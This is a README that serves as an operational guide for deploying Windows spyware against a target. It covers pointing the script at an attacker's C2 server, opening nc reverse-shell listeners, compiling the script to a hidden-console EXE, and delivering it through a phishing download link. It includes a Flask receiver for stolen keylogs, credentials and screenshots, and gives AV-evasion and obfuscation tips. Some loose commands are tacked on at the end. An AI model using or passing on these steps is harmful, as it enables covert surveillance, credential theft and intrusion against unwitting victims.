**README.md – Spyware Deployment Guide**

---

### 1. Prerequisites

#### Attacker machine:
- Linux or Windows workstation
- Python 3.x (for hosting C2) or Node.js
- Internet-facing server (or ngrok/reverse proxy for testing)
- Listener: `nc`, `socat`, or `pwncat`

#### Target machine:
- Windows 7–11 SPAN (with .NET Framework ≥ 4.0)
- PowerShell Execution Policy bypass capability (`Bypass` flag works on default systems)

---

### 2. Configure C2 Endpoint

Edit the malware file:

```bash
sed -i 's|https://mal.c2/collect|http://<YOUR_IP>:PORT/collect|g' Spyware.ps1
sed -i "s|203.0.113.10|<YOUR_LISTENER_IP>|g" Spyware.ps1
sed -i "s|4444|<YOUR_SHELL_PORT>|g" Spyware.ps1
```

Set up listener:
```bash
nc -lvnp 4444  # for reverse shell
python -m http.server 8080  # optional payload delivery
```

---

### 3. Build Binary (Optional Stealth)

Use [PS2EXE-GUI](https://github.com/MScholtes/PS2EXE) to compile script into EXE:

```powershell
Invoke- PS2EXE -InputFile Spyware.ps1 -OutputFile Spyware.exe -NoConsole
```

This hides console output from the victim.

---

### 4. Host for Target Download

Serve payload over HTTP:

```bash
python3 -m http.server 8000
# Or using Apache/nginx
```

Provide link to target (e.g., via phishing email):

```
Download instructions here: http://<IP>:8000/Spyware.exe
```

---

### 5. Execution on Target

Target double-clicks `Spyware.exe`.
Alternatively, use reflective execution through another vector (e.g., macro, scheduled task, WMI).

---

### 6. Monitor Data Exfiltration

Check incoming connections at your listener.

For HTTP POST data collection:

```python
# c2_server.py (basic receiver)
from flask import Flask, request
app = Flask(__name__)

@app.route('/collect', methods=['POST'])
def receive():
    print(request.form)  # keylogs, screenshots metadata, etc.
    return '', 204

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80)
```

Run it:
```bash
python c2_server.py
```

---

### 7. Additional Notes

- Ensure firewall exceptions allow outbound traffic.
- Use HTTPS C2 to avoid inspection.
- Obfuscate strings using Base64 or XOR before deployment.
- Add sleep obfuscation/AV evasion if needed.

---

### 8. Next Step After Deployment

Once active, monitor:
```bash
tail -f access.log | grep collect
```

Check for received credentials and screen captures.

---

### TL;DR Quick Run:
```bash
git clone https://github.com/redteam/payloads.git
cd payloads
# Edit C2 IPs
python3 -m http.server 8000
# Send Spyware.exe to target
# Start listener
nc -lvnp 4444
```

python -c "import c2_server; print(c2_server.create_task('shell'))"

csc /target:library /out:Stage1.dll Stage1.cs
python -m venv .venv
source .venv/bin/activate
pip install flask cryptography
python c2_server.py